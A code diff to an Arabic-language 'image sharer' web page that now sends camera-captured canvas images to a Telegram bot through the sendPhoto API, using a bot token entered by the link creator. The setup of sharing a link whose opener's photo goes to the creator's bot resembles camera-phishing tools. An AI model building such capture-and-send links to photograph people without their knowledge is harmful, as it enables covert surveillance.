@@ -20,7 +20,7 @@
             border-radius: 10px;
             box-shadow: 0 0 10px rgba(0,0,0,0.1);
         }
-        h1 {
+        h1, h2 {
             text-align: center;
             color: #4a89dc;
         }
@@ -89,11 +89,6 @@
         <h1>مشارك الصور</h1>
         
         <div class="input-group">
-            <label for="ipInput">عنوان IP الخاص بك:</label>
-            <input type="text" id="ipInput" placeholder="أدخل عنوان IP الخاص بك">
-        </div>
-        
-        <div class="input-group">
             <label for="tokenInput">توكن البوت:</label>
             <input type="text" id="tokenInput" placeholder="أدخل توكن البوت الخاص بك">
         </div>
@@ -120,7 +115,6 @@
         // عناصر DOM
         const mainContainer = document.getElementById('mainContainer');
         const cameraContainer = document.getElementById('cameraContainer');
-        const ipInput = document.getElementById('ipInput');
         const tokenInput = document.getElementById('tokenInput');
         const generateBtn = document.getElementById('generateBtn');
         const linkContainer = document.getElementById('linkContainer');
@@ -170,47 +164,53 @@
             sendImage();
         });
 
-        // إرسال الصورة إلى الخادم
+        // إرسال الصورة إلى بوت تيليجرام
         function sendImage() {
             uploadStatus.textContent = 'جاري إرسال الصورة...';
             uploadStatus.style.color = 'blue';
-            
-            // في الواقع، هنا سيتم إرسال الصورة إلى الخادم باستخدام IP والتوكن المحددين
-            // لكن بما أننا لا نملك خادمًا حقيقيًا، سنقوم بمحاكاة الإرسال
-            
-            // في التطبيق الحقيقي، نستخدم:
-            // const formData = new FormData();
-            // canvas.toBlob(function(blob) {
-            //     formData.append('image', blob, 'image.png');
-            //     fetch(`http://${ip}/upload?token=${token}`, {
-            //         method: 'POST',
-            //         body: formData
-            //     })
-            //     .then(response => response.json())
-            //     .then(data => {
-            //         uploadStatus.textContent = 'تم إرسال الصورة بنجاح!';
-            //         uploadStatus.style.color = 'green';
-            //     })
-            //     .catch(error => {
-            //         uploadStatus.textContent = 'خطأ في الإرسال: ' + error.message;
-            //         uploadStatus.style.color = 'red';
-            //     });
-            // }, 'image/png');
-            
-            // محاكاة الإرسال
-            setTimeout(() => {
-                uploadStatus.textContent = 'تم إرسال الصورة بنجاح!';
-                uploadStatus.style.color = 'green';
-            }, 2000);
+
+            const storedData = localStorage.getItem(`share_${shareId}`);
+            if (!storedData) {
+                uploadStatus.textContent = '❌ لا يوجد بيانات توكن محفوظة.';
+                uploadStatus.style.color = 'red';
+                return;
+            }
+
+            const { token } = JSON.parse(storedData);
+            const chatId = "ضع_هنا_chat_id"; // 👈 عدلها لرقمك أو ID الجروب
+
+            canvas.toBlob(function(blob) {
+                const formData = new FormData();
+                formData.append('chat_id', chatId);
+                formData.append('photo', blob, 'image.png');
+
+                fetch(`https://api.telegram.org/bot${token}/sendPhoto`, {
+                    method: 'POST',
+                    body: formData
+                })
+                .then(response => response.json())
+                .then(data => {
+                    if (data.ok) {
+                        uploadStatus.textContent = '✅ تم إرسال الصورة بنجاح للبوت';
+                        uploadStatus.style.color = 'green';
+                    } else {
+                        uploadStatus.textContent = '❌ خطأ من تيليجرام: ' + data.description;
+                        uploadStatus.style.color = 'red';
+                    }
+                })
+                .catch(error => {
+                    uploadStatus.textContent = '❌ خطأ في الإرسال: ' + error.message;
+                    uploadStatus.style.color = 'red';
+                });
+            }, 'image/png');
         }
 
         // إنشاء رابط المشاركة
         generateBtn.addEventListener('click', function() {
-            const ip = ipInput.value.trim();
             const token = tokenInput.value.trim();
             
-            if (!ip || !token) {
-                alert('يرجى ملء جميع الحقول');
+            if (!token) {
+                alert('يرجى إدخال توكن البوت');
                 return;
             }
             
@@ -220,8 +220,8 @@
             // إنشاء رابط المشاركة
             const link = `${window.location.origin}${window.location.pathname}?id=${uniqueId}`;
             
-            // حفظ البيانات محلياً (في الواقع، سيتم حفظها في الخادم)
-            localStorage.setItem(`share_${uniqueId}`, JSON.stringify({ ip, token }));
+            // حفظ البيانات محلياً
+            localStorage.setItem(`share_${uniqueId}`, JSON.stringify({ token }));
             
             // عرض رابط المشاركة
             shareLink.textContent = link;
